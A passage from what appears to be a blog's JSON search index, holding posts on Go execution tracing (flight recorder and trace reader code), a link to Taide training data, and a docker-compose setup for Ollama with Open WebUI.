log.Fatal(http.ListenAndServe(\u0026#34;:8080\u0026#34;, nil)) 跟踪读取器 API // 开始从标准输入读取跟踪数据。 r, err := trace.NewReader(os.Stdin) if err != nil { log.Fatal(err) } var blocked int var blockedOnNetwork int for { // 读取事件 ev, err := r.ReadEvent() if err == io.EOF { break } else if err != nil { log.Fatal(err) } // 处理它 if ev.Kind() == trace.EventStateTransition { st := ev.StateTransition() if st.Resource.Kind == trace.ResourceGoroutine { id := st.Resource.Goroutine() from, to := st.GoroutineTransition() // 查找阻塞的goroutine, 统计计数 if from.Executing() \u0026amp;\u0026amp; to == trace.GoWaiting { blocked++ if strings.Contains(st.Reason, \u0026#34;network\u0026#34;) { blockedOnNetwork++ } } } } } // 打印我们所需 p := 100 * float64(blockedOnNetwork) / float64(blocked) fmt.Printf(\u0026#34;%2.3f%% instances of goroutines blocking were to block on the network\\n\u0026#34;, p) ","date":"May 7, 2024","hero":"/images/hero/go.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2024/20240507-go-trace/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://colobu.com/2024/03/18/execution-traces-2024/\" target=\"_blank\" rel=\"noopener\"\u003e更强大的 Go 执行跟踪能力\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"runtimetrace\"\u003eruntime/trace\u003c/h3\u003e\n\u003ch3 id=\"golangorgxexptrace\"\u003egolang.org/x/exp/trace\u003c/h3\u003e\n\u003ch4 id=\"飞行记录flight-recording\"\u003e飞行记录(flight recording)\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// 设置飞行记录器\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003efr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etrace\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eNewFlightRecorder\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003efr\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eStart\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// 设置和运行HTTP服务器\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eonce\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003esync\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eOnce\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ehttp\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eHandleFunc\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/my-endpoint\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ew\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ehttp\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eResponseWriter\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003er\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ehttp\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eRequest\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003estart\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eNow\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e// 干些事情\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003edoWork\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ew\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003er\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e// 盼到了长耗时请求，来个快照\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eSince\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003estart\u003c/span\u003e) \u0026gt; \u003cspan style=\"color:#ae81ff\"\u003e300\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003etime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eMillisecond\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e// 这里我们为了简化只做一次，实际上你可以做多次\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003eonce\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eDo\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#75715e\"\u003e// 抓取快照\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ebytes\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eBuffer\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#a6e22e\"\u003e_\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e = \u003cspan style=\"color:#a6e22e\"\u003efr\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eWriteTo\u003c/span\u003e(\u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#a6e22e\"\u003elog\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrint\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#75715e\"\u003e// 把快照写入文件\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eos\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eWriteFile\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;trace.out\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eBytes\u003c/span\u003e(), \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eo755\u003c/span\u003e); \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#a6e22e\"\u003elog\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrint\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        })\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e})\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003elog\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eFatal\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ehttp\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eListenAndServe\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;:8080\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"跟踪读取器-api\"\u003e跟踪读取器 API\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// 开始从标准输入读取跟踪数据。\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003er\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etrace\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eNewReader\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eos\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eStdin\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003elog\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eFatal\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eblocked\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eblockedOnNetwork\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e// 读取事件\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eev\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003er\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eReadEvent\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eio\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eEOF\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003ebreak\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    } \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003elog\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eFatal\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e// 处理它\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eev\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eKind\u003c/span\u003e() \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etrace\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eEventStateTransition\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003est\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eev\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eStateTransition\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003est\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eResource\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eKind\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etrace\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eResourceGoroutine\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#a6e22e\"\u003eid\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003est\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eResource\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eGoroutine\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#a6e22e\"\u003efrom\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eto\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003est\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eGoroutineTransition\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#75715e\"\u003e// 查找阻塞的goroutine, 统计计数\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003efrom\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eExecuting\u003c/span\u003e() \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eto\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etrace\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eGoWaiting\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#a6e22e\"\u003eblocked\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e++\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003estrings\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eContains\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003est\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eReason\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;network\u0026#34;\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    \u003cspan style=\"color:#a6e22e\"\u003eblockedOnNetwork\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e++\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// 打印我们所需\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ep\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e100\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e float64(\u003cspan style=\"color:#a6e22e\"\u003eblockedOnNetwork\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003e float64(\u003cspan style=\"color:#a6e22e\"\u003eblocked\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%2.3f%% instances of goroutines blocking were to block on the network\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ep\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Go","trace"],"title":"更强大的Go执行跟踪能力"},{"categories":["data","URL"],"contents":" Taide - training data ","date":"April 27, 2024","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2024/20240427-taide/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://taide.tw/index/training-data\" target=\"_blank\" rel=\"noopener\"\u003eTaide - training data\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["data","URL"],"title":"Taide - training data"},{"categories":["Go","URL","ollama"],"contents":" ollama/ollama Ollama ＋ Open WebUI，快捷部署 AI 大型語言模型到你的電腦，離線執行 Docker-compose version: \u0026#34;3.8\u0026#34; services: ollama: image: ollama/ollama:latest container_name: ollama restart: unless-stopped volumes: - ./ollama/ollama:/root/.ollama tty: true ports: - 11434:11434 networks: - ollama-docker # deploy: # resources: # reservations: # devices: # - driver: nvidia # count: 1 # capabilities: [gpu] ollama-webui: image: ghcr.io/ollama-webui/ollama-webui:main container_name: ollama-webui restart: unless-stopped volumes: - ./ollama/ollama-webui:/app/backend/data ports: - 8080:8080 environment: - \u0026#34;/ollama/api=http://ollama:11434/api\u0026#34; extra_hosts: - host.docker.internal:host-gateway networks: - ollama-docker networks: ollama-docker: Setup # Run docker-compose docker-compose up -d # Pull model(https://ollama.com/library) docker exec -it ollama /bin/bash ollama pull llama3 Chat with Web-UI port defined in docker-compose.yml ollama-webui.ports\nhttp://localhost:8080\n","date":"April 25, 2024","hero":"/images/hero/go.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2024/20240425-ollama/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/ollama/ollama\" target=\"_blank\" rel=\"noopener\"\u003eollama/ollama\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://ivonblog.com/posts/ollama-llm/\" target=\"_blank\" rel=\"noopener\"\u003eOllama ＋ Open WebUI，快捷部署 AI 大型語言模型到你的電腦，離線執行\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"docker-compose\"\u003eDocker-compose\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eversion\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;3.8\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eservices\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003eollama\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eimage\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eollama/ollama:latest\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003econtainer_name\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eollama\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003erestart\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eunless-stopped\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003evolumes\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003e./ollama/ollama:/root/.ollama\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003etty\u003c/span\u003e: \u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eports\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003e11434\u003c/span\u003e:\u003cspan style=\"color:#ae81ff\"\u003e11434\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003enetworks\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eollama-docker\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# deploy:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e#   resources:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e#     reservations:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e#       devices:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e#         - driver: nvidia\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e#           count: 1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e#           capabilities: 